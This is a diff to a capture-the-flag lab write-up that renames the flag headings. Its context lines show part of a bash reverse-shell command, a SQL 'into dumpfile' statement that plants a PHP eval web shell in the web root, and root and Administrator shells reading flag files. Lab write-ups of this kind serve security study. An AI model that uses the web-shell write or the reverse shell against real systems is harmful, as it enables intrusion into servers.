@@ -237,7 +237,7 @@ d}|{bash,-i}"
 root
 ```
 
-## flag #1
+## flag - 01
 
 ```shell
 (remote) root@ubuntu:/# ls -laih /root/
@@ -411,7 +411,7 @@ sselect "<?php @eval($_POST['a']) ?>" into dumpfile 'C:/phpstudy_pro/WWW/shell.p
 
 ![img](img/image_20260435-213518.png)
 
-## flag #2
+## flag - 02
 
 ```shell
 C:\phpstudy_pro\WWW> type C:\Users\Administrator\flag\flag03.txt
@@ -626,7 +626,7 @@ C:\Windows\system32> dir C:\Users\Administrator
               15 Dir(s)  27,668,508,672 bytes free
 ```
 
-## flag #4
+## flag - 04
 
 ```shell
 C:\Windows\system32> type C:\Users\Administrator\flag\flag04.txt
@@ -702,7 +702,7 @@ Welcome to Alibaba Cloud Elastic Compute Service !
 joyce
 ```
 
-## flag #2
+## flag - 02
 
 flag权限较高，需要找一个提权的路径
 
